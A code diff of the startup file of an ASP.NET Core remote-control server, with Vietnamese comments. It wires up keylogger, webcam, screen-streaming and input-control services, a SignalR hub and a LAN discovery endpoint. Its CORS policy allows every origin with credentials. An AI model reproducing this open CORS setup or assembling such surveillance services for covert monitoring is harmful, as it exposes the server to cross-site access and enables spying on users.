@@ -1,5 +1,5 @@
 ﻿using server_os.Hubs;
-using server_os.Services;
+using server_os.Services; // Namespace đúng của dự án
 using Microsoft.AspNetCore.ResponseCompression;
 
 var builder = WebApplication.CreateBuilder(args);
@@ -12,24 +12,30 @@ builder.Services.AddControllers();
 builder.Services.AddEndpointsApiExplorer();
 builder.Services.AddSwaggerGen();
 builder.Services.AddHostedService<SystemMonitorService>();
+
 // A. Đăng ký SignalR (WebSocket)
 builder.Services.AddSignalR();
 
 // B. Đăng ký các Service xử lý logic
-// QUAN TRỌNG: Các service này nên là Singleton để giữ trạng thái
+// QUAN TRỌNG: Các service này phải là Singleton
 builder.Services.AddSingleton<KeyloggerService>();
-builder.Services.AddSingleton<SystemActionService>(); // Đổi sang Singleton cho nhẹ, tạo 1 lần dùng mãi
-builder.Services.AddSingleton<WebcamService>();       // <--- QUAN TRỌNG: Phải có cái này Webcam mới chạy
+builder.Services.AddSingleton<SystemActionService>();
+builder.Services.AddSingleton<WebcamService>();
+
+// --- ĐĂNG KÝ MỚI CHO ULTRAVIEW (Sửa lỗi namespace ở đây) ---
+builder.Services.AddSingleton<ScreenStreamService>(); // Không cần server.Services. ở trước vì đã using server_os.Services
+builder.Services.AddSingleton<InputControlService>();
+// ----------------------------------------------------------
 
 // C. Cấu hình CORS (Cho phép Client React kết nối)
 builder.Services.AddCors(options =>
 {
     options.AddPolicy("AllowReact", policy =>
     {
-        policy.SetIsOriginAllowed(origin => true) // Cho phép MỌI nguồn (localhost, IP LAN,...)
+        policy.SetIsOriginAllowed(origin => true) // Cho phép MỌI nguồn
               .AllowAnyHeader()
               .AllowAnyMethod()
-              .AllowCredentials(); // Bắt buộc cho SignalR
+              .AllowCredentials();
     });
 });
 
@@ -44,16 +50,16 @@ if (app.Environment.IsDevelopment())
 
 app.UseCors("AllowReact"); // Kích hoạt CORS
 
-// D. Cấu hình hiển thị giao diện Server (Dashboard đen)
-app.UseDefaultFiles(); // Tự động tìm index.html
-app.UseStaticFiles();  // Cho phép tải css/js
+// D. Cấu hình hiển thị giao diện Server
+app.UseDefaultFiles();
+app.UseStaticFiles();
 
 app.MapControllers();
 
 // E. Map SignalR Hub
 app.MapHub<SystemHub>("/systemHub");
 
-// F. API Discovery (Để Client quét mạng LAN tìm ra Server)
+// F. API Discovery
 app.MapGet("/api/discovery", () =>
 {
     return Results.Ok(new { message = "REMOTE_SERVER_HERE", machine = Environment.MachineName });
